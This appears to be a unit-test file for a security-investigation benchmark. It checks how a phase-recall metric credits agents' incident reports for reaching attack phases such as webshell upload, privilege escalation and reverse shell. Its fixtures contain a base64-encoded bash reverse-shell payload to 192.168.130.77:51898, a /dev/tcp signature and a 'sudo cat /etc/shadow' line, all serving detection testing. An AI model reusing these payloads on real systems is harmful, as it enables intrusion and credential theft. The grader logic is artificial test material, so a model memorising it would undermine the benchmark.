"""Offline unit tests for the phase_recall metric and the scoring plumbing.

Pure functions of a ScoringContext — no Django, no live services — so they run in
the normal offline suite.
"""
from __future__ import annotations

import os
import sys
import tempfile
import unittest
from pathlib import Path

_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
sys.path.insert(0, _ROOT)

from benchmark import scoring  # noqa: E402
from benchmark.scoring import ScenarioSpec, ScoringContext  # noqa: E402
from benchmark.scoring.context import parse_iso  # noqa: E402
from benchmark.pipeline import report as report_stage  # noqa: E402
from benchmark.pipeline.score import metric_rows  # noqa: E402

# A minimal two-phase scenario built inline, independent of fox.yaml, so the logic
# is tested in isolation from the (evolving) real spec.
_SCENARIO = ScenarioSpec.from_dict({
    "name": "toy",
    "phases": [
        {"name": "webshell", "start": "2022-01-18T12:38:00Z", "end": "2022-01-18T12:38:30Z",
         "agent_id": "27", "content_signature": {"all": ["webshell"]}},
        {"name": "privilege_escalation", "start": "2022-01-18T13:14:30Z", "end": "2022-01-18T13:14:53Z",
         "agent_id": "27", "content_signature": {"all": ["phopkins"]}},
    ],
})


def _phase_result(report_text: str):
    ctx = ScoringContext.build(_SCENARIO, report_text, entry_point="recon")
    (result,) = scoring.run_all(ctx, ["phase_recall"])
    return result


class PhaseRecallTest(unittest.TestCase):
    def test_timestamp_in_window_reaches_phase(self):
        report = "## Confirmed Timeline\n- `2022-01-18T12:38:29Z` — webshell hit (`w2X30PYVatKFcWqVUjiG`)."
        r = _phase_result(report)
        self.assertEqual(r.kind, "per_key")
        self.assertTrue(r.value["webshell"])                 # ts inside webshell window
        self.assertFalse(r.value["privilege_escalation"])    # nothing in privesc window
        self.assertEqual(r.detail["reached"], 1)
        self.assertEqual(r.detail["missed"], ["privilege_escalation"])

    def test_id_only_citation_does_not_reach_phase(self):
        # IDs alone are inert. Phase recall must come from a timestamped evidence line.
        report = "Confirmed privilege escalation via `1700000000.110417`."
        r = _phase_result(report)
        self.assertFalse(r.value["privilege_escalation"])
        self.assertFalse(r.value["webshell"])

    def test_recon_only_report_misses_post_exploitation(self):
        # The canonical Fox failure: cites only the recon alert, reaches neither phase.
        report = "## Confirmed Timeline\n- `2022-01-18T12:19:10Z` — scan alert (`~449101824`)."
        r = _phase_result(report)
        self.assertEqual(r.detail["reached"], 0)
        self.assertFalse(any(r.value.values()))

    def test_rule_numbers_do_not_over_credit(self):
        # Mentioning a rule number in passing must NOT mark a phase reached (rules are
        # shared across phases; timestamped evidence plus phase signature is required.
        report = "The webshell rule 31108 is noisy but nothing was confirmed."
        r = _phase_result(report)
        self.assertEqual(r.detail["reached"], 0)

    def test_range_and_query_window_timestamps_do_not_credit_phase(self):
        # A line carrying TWO timestamps is a range / query-pivot / volume-profile span,
        # not a discrete event citation — its endpoints must not credit a phase whose
        # window they merely straddle. (Regression: get_event_volume bin labels and
        # `time=<from>/<to>` pivots scored wide windows as reached.)
        for line in (
            "pivots: user=phopkins, time=2022-01-18T12:38:00Z/2022-01-18T12:39:00Z (`someid`)",
            "get_event_volume plateau begins at `2022-01-18T12:38:10Z`, peaks at 2022-01-18T12:40:00Z",
            "the queried window 2022-01-18T12:38:00Z–2022-01-18T12:38:30Z returned 0 events",
        ):
            self.assertEqual(_phase_result(line).detail["reached"], 0, line)

    def test_compact_range_suffix_does_not_credit_phase(self):
        scen = ScenarioSpec.from_dict({"name": "toy_range", "phases": [
            {"name": "reverse_shell", "start": "2022-01-18T13:13:50Z", "end": "2022-01-18T13:14:30Z",
             "agent_id": "27", "content_signature": {"all": ["wp_meta"]}},
        ]})
        ctx = ScoringContext.build(
            scen,
            "Success criteria: searched `2022-01-18T13:10:00Z/13:20:00Z` and saw decoded wp_meta.",
        )
        (r,) = scoring.run_all(ctx, ["phase_recall"])
        self.assertFalse(r.value["reverse_shell"])

    def test_discrete_single_timestamp_citation_still_credits(self):
        # The complement: one timestamp on the line (a real citation) still counts.
        report = "- `2022-01-18T12:38:20Z` — `w2X30PYVatKFcWqVUjiG`: webshell upload."
        self.assertTrue(_phase_result(report).value["webshell"])

    def test_event_time_resolution_is_ignored_for_phase_credit(self):
        # Passing event_times is still tolerated for compatibility, but it no longer
        # contributes phase coverage.
        report = "- command: [decoded] [\"bash\",\"-c\",\"…51898…\"] [qDqTUjp7_4q5yqmXwtAG]"
        ctx = ScoringContext.build(
            _SCENARIO, report, entry_point="recon",
            event_times={"qDqTUjp7_4q5yqmXwtAG": "2022-01-18T12:38:15Z"},  # inside webshell window
        )
        (r,) = scoring.run_all(ctx, ["phase_recall"])
        self.assertFalse(r.value["webshell"])

    def test_bracket_id_without_resolution_does_not_credit(self):
        # A bracket id alone is inert.
        report = "- command: [decoded] [qDqTUjp7_4q5yqmXwtAG]"
        self.assertEqual(_phase_result(report).detail["reached"], 0)

    def test_unscorable_phase_excluded_from_denominator(self):
        # A phase with no distinguishing event (scorable: false) is dropped from recall.
        scen = ScenarioSpec.from_dict({"name": "toy2", "phases": [
            {"name": "webshell", "start": "2022-01-18T12:38:00Z", "end": "2022-01-18T12:38:30Z",
             "agent_id": "27"},
            {"name": "dnsteal", "start": "2022-01-17T09:04:48Z", "end": "2022-01-17T10:00:00Z",
             "agent_id": "18", "scorable": False},
        ]})
        ctx = ScoringContext.build(scen, "- `2022-01-18T12:38:20Z` — `w2X30PYVatKFcWqVUjiG`.")
        (r,) = scoring.run_all(ctx, ["phase_recall"])
        self.assertEqual(r.detail["total"], 1)          # only webshell counts
        self.assertNotIn("dnsteal", r.value)
        self.assertEqual(r.detail["recall"], 1.0)

    def test_content_signature_gates_printed_timestamp_credit(self):
        scen = ScenarioSpec.from_dict({"name": "toy3", "phases": [
            {"name": "reverse_shell", "start": "2022-01-18T13:13:50Z", "end": "2022-01-18T13:14:30Z",
             "agent_id": "27", "content_signature": {"all": ["wp_meta"]}},
        ]})
        ctx = ScoringContext.build(
            scen,
            "- `2022-01-18T13:14:18Z` — request for /wp-content/uploads/a.php?wp_meta=abc.",
        )
        (r,) = scoring.run_all(ctx, ["phase_recall"])
        self.assertTrue(r.value["reverse_shell"])

        ctx = ScoringContext.build(
            scen,
            "- `2022-01-18T13:14:18Z` — same-host benign HTTP `GET /`.",
        )
        (r,) = scoring.run_all(ctx, ["phase_recall"])
        self.assertFalse(r.value["reverse_shell"])

    def test_timestamp_without_signature_does_not_credit(self):
        scen = ScenarioSpec.from_dict({"name": "toy4", "phases": [
            {"name": "reverse_shell", "start": "2022-01-18T13:13:50Z", "end": "2022-01-18T13:14:30Z",
             "agent_id": "27", "content_signature": {"all": ["wp_meta"]}},
        ]})
        ctx = ScoringContext.build(
            scen,
            "- `2022-01-18T13:14:18Z` — same-host benign HTTP `GET /`.",
        )
        (r,) = scoring.run_all(ctx, ["phase_recall"])
        self.assertFalse(r.value["reverse_shell"])

    def test_surface_line_can_bridge_to_matching_raw_event(self):
        scen = ScenarioSpec.from_dict({"name": "toy5", "phases": [
            {"name": "reverse_shell", "start": "2022-01-18T13:13:50Z", "end": "2022-01-18T13:14:30Z",
             "agent_id": "27", "content_signature": {"all": ["wp_meta"]}},
        ]})
        ctx = ScoringContext.build(
            scen,
            "- `_id=qDqTUjp7_4q5yqmXwtAG` shows decoded `wp_meta` with reverse-shell content.",
            raw_events=[
                (
                    "qDqTUjp7_4q5yqmXwtAG",
                    parse_iso("2022-01-18T13:14:18Z"),
                    '{"@timestamp":"2022-01-18T13:14:18Z","full_log":"GET /payload?wp_meta=abc"}',
                )
            ],
        )
        (r,) = scoring.run_all(ctx, ["phase_recall"])
        self.assertTrue(r.value["reverse_shell"])

    def test_raw_event_match_counts_even_if_report_line_is_inventory_style(self):
        scen = ScenarioSpec.from_dict({"name": "toy6", "phases": [
            {"name": "service_stop", "start": "2022-01-17T09:04:46Z", "end": "2022-01-17T09:04:48Z",
             "agent_id": "1", "content_signature": {"all": ["service_stop", "unit=consequuntur"]}},
        ]})
        ctx = ScoringContext.build(
            scen,
            "- ip: 10.35.33.111 [W97tlNbPiHN2dM3J4ymz]",
            raw_events=[
                (
                    "W97tlNbPiHN2dM3J4ymz",
                    parse_iso("2022-01-17T09:04:47Z"),
                    '{"@timestamp":"2022-01-17T09:04:47Z","full_log":"type=SERVICE_STOP msg=audit(...): unit=consequuntur"}',
                )
            ],
        )
        (r,) = scoring.run_all(ctx, ["phase_recall"])
        self.assertTrue(r.value["service_stop"])

    def test_bridge_decodes_wp_meta_payload_terms(self):
        # Regression: exploit payload terms can live only in URL-encoded/base64
        # wp_meta. Raw matching must decode before applying content signatures.
        scen = ScenarioSpec.from_dict({"name": "toy_wpmeta", "phases": [
            {"name": "reverse_shell", "start": "2022-01-18T13:13:50Z", "end": "2022-01-18T13:14:30Z",
             "agent_id": "27", "content_signature": {"all": ["wp_meta", "/dev/tcp/192.168.130.77/51898"]}},
        ]})
        ctx = ScoringContext.build(
            scen,
            "- surfaced event `qDqTUjp7_4q5yqmXwtAG` indicates post-exploitation webshell activity.",
            raw_events=[
                (
                    "qDqTUjp7_4q5yqmXwtAG",
                    parse_iso("2022-01-18T13:14:18Z"),
                    (
                        '{"@timestamp":"2022-01-18T13:14:18Z",'
                        '"data":{"url":"/wp-content/uploads/2022/01/yqagisjaqe.php?wp_meta='
                        'WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsg'
                        'c2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D"}}'
                    ),
                )
            ],
        )
        (r,) = scoring.run_all(ctx, ["phase_recall"])
        self.assertTrue(r.value["reverse_shell"])

    def test_legacy_any_bucket_is_conjunctive(self):
        scen = ScenarioSpec.from_dict({"name": "toy7", "phases": [
            {"name": "webshell", "start": "2022-01-18T12:38:00Z", "end": "2022-01-18T12:38:30Z",
             "agent_id": "27", "content_signature": {"any": ["wp_meta", "wordpress_db"]}},
        ]})
        ctx = ScoringContext.build(
            scen,
            "- `2022-01-18T12:38:20Z` — wp_meta request only.",
        )
        (r,) = scoring.run_all(ctx, ["phase_recall"])
        self.assertFalse(r.value["webshell"])


class AnchorEchoTest(unittest.TestCase):
    """The harness injects an incident timestamp into the agent's question; a bare
    restatement of it must NOT credit phase_recall for the phase whose window contains
    it. Regression: fox privesc/2 concluded FP with zero retrieved evidence yet scored
    the privilege_escalation phase 'reached' purely from echoing 2022-01-18T13:14:31Z.
    """

    ANCHOR = "2022-01-18T13:14:31Z"  # falls inside the privilege_escalation window

    def _score(self, report_text: str):
        ctx = ScoringContext.build(
            _SCENARIO, report_text, entry_point="privilege_escalation",
            meta={"anchor_timestamp": self.ANCHOR},
        )
        (result,) = scoring.run_all(ctx, ["phase_recall"])
        return result

    def test_bare_anchor_echo_does_not_credit_phase(self):
        # The echoed question line: anchor timestamp, no event id → hollow, not reached.
        report = ("**Question:** Triage and investigate alert ~1. The alert corresponds "
                  "to activity observed around 2022-01-18T13:14:31Z.")
        self.assertFalse(self._score(report).value["privilege_escalation"])

    def test_anchor_cited_with_event_id_still_credits_phase(self):
        # A genuine retrieval: the anchor instant alongside a real event id → reached.
        report = "- `2022-01-18T13:14:31Z` — `eYzntgXUZwhw5Nh_-HUS`: su/UID change to phopkins."
        self.assertTrue(self._score(report).value["privilege_escalation"])

    def test_distinct_in_window_event_still_credits_despite_echo(self):
        # Echoed anchor (no id) PLUS a distinct in-window event (with id) → reached via the real one.
        report = ("**Question:** …activity observed around 2022-01-18T13:14:31Z.\n"
                  "- `2022-01-18T13:14:49Z` — `3kp8gZqt29xgUPf7VD3i`: phopkins sudo cat /etc/shadow.")
        self.assertTrue(self._score(report).value["privilege_escalation"])

    def test_no_anchor_meta_preserves_legacy_behavior(self):
        # Without an injected anchor, a bare in-window timestamp still counts if it carries
        # phase-identifying content.
        report = "- 2022-01-18T13:14:31Z — phopkins activity noted."
        ctx = ScoringContext.build(_SCENARIO, report, entry_point="privilege_escalation")
        (result,) = scoring.run_all(ctx, ["phase_recall"])
        self.assertTrue(result.value["privilege_escalation"])


class InvalidTrialExclusionTest(unittest.TestCase):
    """A trial where the requested agent failed (trial_valid=False) must be excluded
    from the recall roll-up — regression: an infra Connection error fell back to the
    triage report and was scored as a real recall-0 trial (privesc/3)."""

    def _card(self, *, trial, valid, webshell_hit):
        r = _phase_result(
            "Confirmed webshell via `2022-01-18T12:38:29Z` (`w2X30PYVatKFcWqVUjiG`)." if webshell_hit else "nothing."
        )
        return {
            "scenario": "toy", "entry_point": "recon", "trial": trial,
            "status": "completed" if valid else "failed", "trial_valid": valid,
            "results": [{"name": r.name, "kind": r.kind, "value": r.value, "detail": r.detail}],
        }

    def test_invalid_trial_excluded_from_rollup(self):
        from benchmark.pipeline.report import aggregate_cards
        cards = [
            self._card(trial=1, valid=True, webshell_hit=True),   # real hit
            self._card(trial=2, valid=False, webshell_hit=False),  # infra failure → must not count
        ]
        agg = aggregate_cards(cards)["toy"]["recon"]
        self.assertEqual(agg["trials"], 1)            # only the valid trial
        self.assertEqual(agg["excluded_trials"], 1)
        self.assertEqual(agg["metrics"]["phase_recall"]["per_key"]["webshell"], 1.0)  # not diluted to 0.5


class FoxSpecTest(unittest.TestCase):
    def test_fox_scenario_loads(self):
        path = os.path.join(_ROOT, "benchmark", "config", "scenarios", "fox.yaml")
        spec = ScenarioSpec.from_yaml(path)
        self.assertEqual(spec.name, "fox")
        # 10 labelled phases; network_scans and dnsteal have no distinguishing event in the
        # dataset and are marked unscorable (excluded from the recall denominator).
        self.assertEqual(len(spec.phases), 10)
        by_name = {p.name: p for p in spec.phases}
        self.assertFalse(by_name["network_scans"].scorable)
        self.assertFalse(by_name["dnsteal"].scorable)
        self.assertTrue(by_name["reverse_shell"].scorable)
        # corrected detecting rules (were mis-identified in the prior spec)
        self.assertEqual(by_name["cracking"].marker_rules, {"31108"})          # was 86601 (a scan rule)
        self.assertEqual(by_name["privilege_escalation"].marker_rules, {"5304", "5402"})  # was 5501
        # every phase parsed a valid window
        self.assertTrue(all(p.start and p.end and p.end >= p.start for p in spec.phases))
        # entry points tagged organic vs synthetic
        kinds = {e.id: e.kind for e in spec.entry_points}
        self.assertEqual(kinds["recon"], "organic")
        self.assertEqual(kinds["privilege_escalation"], "synthetic")

    def test_fox_scorable_phases_define_content_signatures(self):
        path = os.path.join(_ROOT, "benchmark", "config", "scenarios", "fox.yaml")
        spec = ScenarioSpec.from_yaml(path)
        for phase in spec.phases:
            if phase.scorable:
                self.assertTrue(phase.content_signature, phase.name)


class PandasFriendlyOutputTest(unittest.TestCase):
    def test_metric_rows_flattens_per_key_values(self):
        r = _phase_result("Confirmed webshell via `2022-01-18T12:38:29Z`.")
        card = {
            "scenario": "toy",
            "entry_point": "recon",
            "trial": 1,
            "status": "completed",
            "results": [
                {
                    "name": r.name,
                    "kind": r.kind,
                    "value": r.value,
                    "detail": r.detail,
                }
            ],
        }

        rows = metric_rows(card)

        self.assertEqual(len(rows), 2)
        by_key = {row["key"]: row for row in rows}
        self.assertTrue(by_key["webshell"]["value"])
        self.assertFalse(by_key["privilege_escalation"]["value"])
        self.assertEqual(by_key["webshell"]["metric"], "phase_recall")
        self.assertEqual(by_key["webshell"]["detail_recall"], 0.5)
        self.assertEqual(by_key["webshell"]["detail_missed"], '["privilege_escalation"]')

    def test_report_writes_scenario_csv(self):
        cards = [
            {
                "scenario": "toy",
                "entry_point": "recon",
                "trial": 1,
                "status": "completed",
                "results": [
                    {
                        "name": "phase_recall",
                        "kind": "per_key",
                        "value": {"webshell": True, "privilege_escalation": False},
                        "detail": {"reached": 1, "total": 2, "recall": 0.5, "missed": ["privilege_escalation"]},
                    }
                ],
            }
        ]
        with tempfile.TemporaryDirectory() as tmp:
            report_stage.run(cards, tmp)
            csv_text = (Path(tmp) / "toy.csv").read_text(encoding="utf-8")

        self.assertIn("metric", csv_text)
        self.assertIn("phase_recall", csv_text)
        self.assertIn("webshell", csv_text)


if __name__ == "__main__":
    unittest.main(verbosity=2)
